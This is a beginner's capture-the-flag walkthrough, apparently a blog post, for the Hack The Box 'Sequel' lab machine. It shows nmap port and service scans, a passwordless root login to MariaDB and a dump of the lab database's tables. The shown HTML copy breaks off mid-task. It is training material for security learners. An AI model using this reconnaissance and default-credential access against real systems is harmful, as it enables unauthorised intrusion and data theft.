<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Sequel - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,sequel,tier-1,free-tier,vulnerability-assessment,databases,mysql,sql,reconnaissance,weak-credentials,linux-target,easy-box,user-own,system-own"><meta name=description content="The aim of this walkthrough is to provide help with the Sequel machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/sequel/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Sequel - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Sequel machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/sequel/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-05T18:00:00+00:00"><meta property="article:modified_time" content="2023-05-05T18:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Sequel - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Sequel machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Sequel - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/sequel/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Sequel - Walkthrough","name":"HTB - Sequel - Walkthrough","description":"The aim of this walkthrough is to provide help with the Sequel machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","sequel","tier-1","free-tier","vulnerability-assessment","databases","mysql","sql","reconnaissance","weak-credentials","linux-target","easy-box","user-own","system-own"],"articleBody":"The aim of this walkthrough is to provide help with the Sequel machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ You could use the unset command to remove it after you no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: During our scan, which port do we find serving MySQL?\nLet’s start our recon with an all-port nmap scan. Use the -V5 option to set the timing template to the fastest.\n┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $nmap -p- -T5 $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 20:46 BST Warning: 10.129.17.29 giving up on port because retransmission cap hit (2). Nmap scan report for 10.129.17.29 Host is up (0.037s latency). Not shown: 62285 closed tcp ports (conn-refused), 3249 filtered tcp ports (no-response) PORT STATE SERVICE 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 69.04 seconds ┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $ 3306\nTASK 2 Question: What community-developed MySQL version is the target running?\nWell, running nmap with the -sV to detect the service and it’s version does not help us (program hangs).\n┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $nmap -p 3306 -sV $rhost -vvv Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 21:02 BST NSE: Loaded 45 scripts for scanning. Initiating Ping Scan at 21:02 Scanning 10.129.17.29 [2 ports] Completed Ping Scan at 21:02, 0.01s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:02 Completed Parallel DNS resolution of 1 host. at 21:02, 0.00s elapsed DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating Connect Scan at 21:02 Scanning 10.129.17.29 [1 port] Discovered open port 3306/tcp on 10.129.17.29 Completed Connect Scan at 21:02, 0.01s elapsed (1 total ports) Initiating Service scan at 21:02 Scanning 1 service on 10.129.17.29 ... We try again, but this time we only run scripts from the safe category (--script=safe option).\n┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $nmap -p 3306 --script=safe $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 21:13 BST Pre-scan script results: |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/ | targets-asn: |_ targets-asn.asn is a mandatory parameter |_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.com/wpad.dat) from server |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/ Nmap scan report for 10.129.17.29 Host is up (0.013s latency). PORT STATE SERVICE 3306/tcp open mysql | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.27-MariaDB-0+deb10u1 | Thread ID: 124 | Capabilities flags: 63486 | Some Capabilities: IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSigpipes, Support41Auth, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsTransactions, SupportsCompression, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults | Status: Autocommit | Salt: zP_k{KAG}dYsW;_L\u003e1{\u003c |_ Auth Plugin Name: mysql_native_password Host script results: | port-states: | tcp: |_ open: 3306 | unusual-port: |_ WARNING: this script depends on Nmap's service/version detection (-sV) | dns-blacklist: | SPAM |_ l2.apews.org - FAIL |_fcrdns: FAIL (No PTR record) Post-scan script results: | reverse-index: |_ 3306/tcp: 10.129.17.29 Nmap done: 1 IP address (1 host up) scanned in 112.12 seconds ┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $ MariaDB\nTASK 3 Question: When using the MySQL command line client, what switch do we need to use in order to specify a login username?\nUsing the program’s built-in help can help us identifying the correct options we need to use.\n┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $mysql --help mysql Ver 15.1 Distrib 10.5.19-MariaDB, for debian-linux-gnu (x86_64) using EditLine wrapper Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Usage: mysql [OPTIONS] [database] ... -u, --user=name User for login if not current user. ... ┌─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $ -u\nTASK 4 Question: Which username allows us to log into this MariaDB instance without providing a password?\nWhy not try some default credentials?\n─[htb-bluewalle@htb-nn4sxa7ryy]─[~/Desktop] └──╼ $mysql -h $rhost -u root Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 147 Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u003e root\nTASK 5 Question: In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?\nReading up a bit on sql should provide you with the desired answer.\n*\nTASK 6 Question: In SQL, what symbol do we need to end each query with?\nIt is literally displayed by the MariaDB welcome message.\n;\nTASK 7 Question: There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host?\nUse the show command to list out all the available databases.\nMariaDB [(none)]\u003e show databases; +--------------------+ | Database | +--------------------+ | htb | | information_schema | | mysql | | performance_schema | +--------------------+ 4 rows in set (0.014 sec) MariaDB [(none)]\u003e From these, the only one that particularly stands out is the htb database.\nhtb\nSUBMIT FLAG Question: Submit root flag\nTry and dump the contents of the htb database. One way to do this is to first select the htb database and then list all it’s tables.\nMariaDB [(none)]\u003e use htb Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [htb]\u003e show tables; +---------------+ | Tables_in_htb | +---------------+ | config | | users | +---------------+ 2 rows in set (0.011 sec) MariaDB [htb]\u003e Dump all the data in the tables. Use the information obtained in the previous tasks to solve this.\nuseful information task usage of * TASK5 usage of ; TASK6 targeted database TASK7 The only missing piece of information is the select command which we can easily look up online.\nMariaDB [htb]\u003e select * from config; +----+-----------------------+----------------------------------+ | id | name | value | +----+-----------------------+----------------------------------+ | 1 | timeout | 60s | | 2 | security | default | | 3 | auto_logon | false | | 4 | max_size | 2M | | 5 | flag | | | 6 | enable_uploads | false | | 7 | authentication_method | radius | +----+-----------------------+----------------------------------+ 7 rows in set (0.012 sec) MariaDB [htb]\u003e select * from users; +----+----------+------------------+ | id | username | email | +----+----------+------------------+ | 1 | admin | admin@sequel.htb | | 2 | lara | lara@sequel.htb | | 3 | sam | sam@sequel.htb | | 4 | mary | mary@sequel.htb | +----+----------+------------------+ 4 rows in set (0.012 sec) MariaDB [htb]\u003e The flag is in the config table.\nflag\nMake sure to terminate the target box before you continue with the next machine!\n","wordCount":"1225","inLanguage":"en","datePublished":"2023-05-05T18:00:00Z","dateModified":"2023-05-05T18:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/sequel/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Sequel - Walkthrough</h1><div class=post-meta><span title='2023-05-05 18:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1225 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Sequel</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 1</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>You could use the <em><strong>unset</strong></em> command to remove it after you no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>During our scan, which port do we find serving MySQL?</em></p><p>Let&rsquo;s start our <strong>recon</strong> with an <strong>all-port</strong> <em><strong>nmap</strong></em> scan. Use the <em>-V5</em> <strong>option</strong> to set the <strong>timing template</strong> to the fastest.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$nmap</span> -p- -T5 <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-05 20:46 BST
</span></span><span class=line><span class=cl>Warning: 10.129.17.29 giving up on port because retransmission cap hit <span class=o>(</span>2<span class=o>)</span>.
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.17.29
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.037s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>62285</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>, <span class=m>3249</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>3306/tcp open  mysql
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 69.04 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><blockquote><p>3306</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What community-developed MySQL version is the target running?</em></p><p>Well, running <em><strong>nmap</strong></em> with the <em>-sV</em> to <strong>detect</strong> the <strong>service</strong> and it&rsquo;s <strong>version</strong> does not help us (program hangs).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$nmap</span> -p <span class=m>3306</span> -sV <span class=nv>$rhost</span> -vvv
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-05 21:02 BST
</span></span><span class=line><span class=cl>NSE: Loaded <span class=m>45</span> scripts <span class=k>for</span> scanning.
</span></span><span class=line><span class=cl>Initiating Ping Scan at 21:02
</span></span><span class=line><span class=cl>Scanning 10.129.17.29 <span class=o>[</span><span class=m>2</span> ports<span class=o>]</span>
</span></span><span class=line><span class=cl>Completed Ping Scan at 21:02, 0.01s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
</span></span><span class=line><span class=cl>Initiating Parallel DNS resolution of <span class=m>1</span> host. at 21:02
</span></span><span class=line><span class=cl>Completed Parallel DNS resolution of <span class=m>1</span> host. at 21:02, 0.00s elapsed
</span></span><span class=line><span class=cl>DNS resolution of <span class=m>1</span> IPs took 0.00s. Mode: Async <span class=o>[</span><span class=c1>#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
</span></span><span class=line><span class=cl>Initiating Connect Scan at 21:02
</span></span><span class=line><span class=cl>Scanning 10.129.17.29 <span class=o>[</span><span class=m>1</span> port<span class=o>]</span>
</span></span><span class=line><span class=cl>Discovered open port 3306/tcp on 10.129.17.29
</span></span><span class=line><span class=cl>Completed Connect Scan at 21:02, 0.01s elapsed <span class=o>(</span><span class=m>1</span> total ports<span class=o>)</span>
</span></span><span class=line><span class=cl>Initiating Service scan at 21:02
</span></span><span class=line><span class=cl>Scanning <span class=m>1</span> service on 10.129.17.29
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>We try again, but this time we <strong>only</strong> run <strong>scripts</strong> from the <strong>safe</strong> <strong>category</strong> (<em>--script=safe</em> <strong>option</strong>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$nmap</span> -p <span class=m>3306</span> --script<span class=o>=</span>safe <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-05 21:13 BST
</span></span><span class=line><span class=cl>Pre-scan script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex<span class=s1>&#39;s API. See https://www.robtex.com/api/
</span></span></span><span class=line><span class=cl><span class=s1>| targets-asn: 
</span></span></span><span class=line><span class=cl><span class=s1>|_  targets-asn.asn is a mandatory parameter
</span></span></span><span class=line><span class=cl><span class=s1>|_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.com/wpad.dat) from server
</span></span></span><span class=line><span class=cl><span class=s1>|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex&#39;</span>s API. See https://www.robtex.com/api/
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.17.29
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>3306/tcp open  mysql
</span></span><span class=line><span class=cl><span class=p>|</span> mysql-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Protocol: <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
</span></span><span class=line><span class=cl><span class=p>|</span>   Thread ID: <span class=m>124</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Capabilities flags: <span class=m>63486</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Some Capabilities: IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSigpipes, Support41Auth, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsTransactions, SupportsCompression, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
</span></span><span class=line><span class=cl><span class=p>|</span>   Status: Autocommit
</span></span><span class=line><span class=cl><span class=p>|</span>   Salt: zP_k<span class=o>{</span>KAG<span class=o>}</span>dYsW<span class=p>;</span>_L&gt;1<span class=o>{</span>&lt;
</span></span><span class=line><span class=cl><span class=p>|</span>_  Auth Plugin Name: mysql_native_password
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> port-states: 
</span></span><span class=line><span class=cl><span class=p>|</span>   tcp: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    open: <span class=m>3306</span>
</span></span><span class=line><span class=cl><span class=p>|</span> unusual-port: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  WARNING: this script depends on Nmap<span class=err>&#39;</span>s service/version detection <span class=o>(</span>-sV<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> dns-blacklist: 
</span></span><span class=line><span class=cl><span class=p>|</span>   SPAM
</span></span><span class=line><span class=cl><span class=p>|</span>_    l2.apews.org - FAIL
</span></span><span class=line><span class=cl><span class=p>|</span>_fcrdns: FAIL <span class=o>(</span>No PTR record<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Post-scan script results:
</span></span><span class=line><span class=cl><span class=p>|</span> reverse-index: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  3306/tcp: 10.129.17.29
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 112.12 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><blockquote><p>MariaDB</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>When using the MySQL command line client, what switch do we need to use in order to specify a login username?</em></p><p>Using the program&rsquo;s <strong>built-in</strong> <em><strong>help</strong></em> can help us identifying the correct <strong>options</strong> we need to use.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$mysql</span> --help
</span></span><span class=line><span class=cl>mysql  Ver 15.1 Distrib 10.5.19-MariaDB, <span class=k>for</span> debian-linux-gnu <span class=o>(</span>x86_64<span class=o>)</span> using  EditLine wrapper
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Usage: mysql <span class=o>[</span>OPTIONS<span class=o>]</span> <span class=o>[</span>database<span class=o>]</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>  -u, --user<span class=o>=</span>name     User <span class=k>for</span> login <span class=k>if</span> not current user.
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><blockquote><p>-u</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>Which username allows us to log into this MariaDB instance without providing a password?</em></p><p>Why not try some <strong>default</strong> <strong>credentials</strong>?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>─<span class=o>[</span>htb-bluewalle@htb-nn4sxa7ryy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
